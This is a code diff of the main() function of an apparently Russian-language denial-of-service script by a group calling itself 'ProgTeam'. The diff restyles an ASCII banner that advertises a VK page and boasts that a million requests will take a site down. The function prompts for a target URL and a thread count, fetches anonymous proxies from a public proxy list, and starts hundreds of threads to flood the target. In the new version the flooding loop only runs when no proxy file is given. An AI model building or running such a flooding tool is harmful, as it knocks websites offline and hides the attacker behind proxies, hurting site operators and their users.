@@ -76,53 +76,50 @@ def send (site, proxy):
 			continue
 
 def main ():
-    print("""
-<python 3>
-    print(Fore.BLUE + ""Лабаратория 'ProgTeam' приветствует."")
-        </python 3>
-""")
-    print(Fore.GREEN + """
-8888888888888
-88888888      888
-88         88        88
-88         88    8888
-88         88    8888
-88         88888888
-88                 88888
-""")
-pint(Fore.BLUE + """
-Наш паблик вк vk.com/progteamlub
-ЦЕЛЬ 100 САБОВ! Мы вас любим♡♡♡""" + Fore.PINK + """
-
-Стандарт прокси: localhost
-Ставь 1000000 запросов и сайт ляжет.
+    flag=(Fore.GREEN + '''
+88888888888888
+8888888    888
+88   88    888
+88   88  88888
+88   88  88888
+88   888888888
+88       88888
+88888888888888
+88888888888888''')
+    print(flag)
+    chel=(Fore.RED + """
+Наш паблик вк v̲k̲.c̲o̲m̲/p̲r̲o̲g̲t̲e̲a̲m̲l̲u̲b̲
+ЦЕЛЬ 1̲0̲0̲ САБОВ! Мы вас любим♡♡♡""")
+    print(chel)
+    print(Fore.BLUE + """Стандарт прокси: ʟᴏᴄᴀʟʜᴏsᴛ
+Ставь 1͟͟͟͞͞͞0͟͟͟͞͞͞0͟͟͟͞͞͞0͟͟͟͞͞͞0͟͟͟͞͞͞0͟͟͟͞͞͞0͟͟͟͞͞͞ запросов и сайт ляжет.
 Удачи!!
 
->.:DoS top:.<
+>.:ᴅᴏs ᴛᴏᴘ:.<
 	""")
 
-	site=input('Введите url сайта: ')
-	thread=input('Введите кол-во потоков (Выстови миллион и - сайт, удачи!)\n -->   ')
-	proxy=input('Введите файл с proxy (или будут использоваться стандартные): ')
+    site = input ('Введите ᴜʀʟ сайта\n' + Fore.GREEN + '☆--> ')
+    thread = input ('Введите кол-во потоков (Выстови миллион и - сайт, удачи!)\n' + Fore.BLUE + '☆--> ')
 
-	if thread.strip () == '':
-		thread = 500
+    proxy = input ('Введите файл с proxy (или будут использоваться стандартные)\n' + Fore.RED + '☆--> ')
 
-	if proxy.strip () == '':
-		get_proxy ('https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=2000&country=all&anonymity=elite&ssl=yes')
-		proxy = 'proxies.txt'
+    if thread.strip () == '':
+        thread = 500
 
-	thread_list = []
-
-	try:
-		for i in range (int(thread)):
-			t = threading.Thread (target = send, name = 'thread{}'.format (i), args = (site, proxy))
-			thread_list.append (t)
-			t.start()
-	except:
-		for t in thread_list:
-			t.join ()
-			print (Fore.RED + 'Все proxy заблокированы. DoS остановлен...')
+    if proxy.strip () == '':
+        get_proxy ('https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=2000&country=all&anonymity=elite&ssl=yes')
+        proxy = 'proxies.txt'
+        
+        thread_list = []
+        try:
+            for i in range (int(thread)):
+                t = threading.Thread (target = send, name = 'thread{}'.format (i), args = (site, proxy))
+                thread_list.append (t)
+                t.start()
+        except:
+                    for t in thread_list:
+                        t.join ()
+                        print (Fore.RED + 'Все proxy заблокированы. DoS остановлен...')
 
 if __name__ == '__main__':
 	clear ()
